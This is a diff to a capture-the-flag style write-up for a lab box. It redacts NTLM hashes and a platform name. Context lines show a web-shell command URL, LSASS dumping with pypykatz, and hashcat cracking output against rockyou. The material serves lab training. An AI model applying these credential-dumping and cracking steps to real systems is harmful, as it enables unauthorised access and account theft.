@@ -39,7 +39,6 @@ http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami
 
 ## Box Details
 
-**Platform:** Hacksmarter
 **Operating System:** Windows and Linux
 **Difficulty:** Medium
 **Linux - MySQL Server:** `10.0.18.213`
@@ -628,9 +627,9 @@ pypykatz lsa minidump lsass.dmp
 
 ```bash
 cat > /workspace/ntlm_hashes.txt << 'EOF'
-58a478135a93ac3bf058a5ea0e8fdb71
-c2c67b565cbf45f1c6b47c9d20ab138b
-54cea054826ad7e3ed45bad5e0b7dc42
+[HASH REDACTED]
+[HASH REDACTED]
+[HASH REDACTED]
 EOF
 ```
 
@@ -646,7 +645,7 @@ UwU Toolkit hashcrack > run
 [*] Loaded hashes from: /workspace/ntlm_hashes.txt
 [*] No hash type specified, attempting to identify...
 [+] Detected hash type: NTLM (or MD5 - mode 0) (mode: 1000)
-[*] Sample hash: 58a478135a93ac3bf058a5ea0e8fdb71...
+[*] Sample hash: [HASH REDACTED]...
 
 [?] Use hash type 1000 (NTLM (or MD5 - mode 0))? [Y/n]: y
 [*] Transferring hashes to omarchy...
@@ -670,8 +669,8 @@ Dictionary cache hit:
 * Filename..: /home/p3ta/tools/rockyou.txt
 * Passwords.: 14344385
 
-58a478135a93ac3bf058a5ea0e8fdb71:[REDACTED]
-c2c67b565cbf45f1c6b47c9d20ab138b:[REDACTED]
+[HASH REDACTED]:[REDACTED]
+[HASH REDACTED]:[REDACTED]
 
 Session..........: hashcat
 Status...........: Exhausted
@@ -682,8 +681,8 @@ Progress.........: 14344385/14344385 (100.00%)
 Speed.#01........: 24602.1 kH/s (2.29ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
 
 === CRACKED ===
-58a478135a93ac3bf058a5ea0e8fdb71:[REDACTED]
-c2c67b565cbf45f1c6b47c9d20ab138b:[REDACTED]
+[HASH REDACTED]:[REDACTED]
+[HASH REDACTED]:[REDACTED]
 
 Connection to 172.17.0.1 closed.
 [+] Module completed successfully
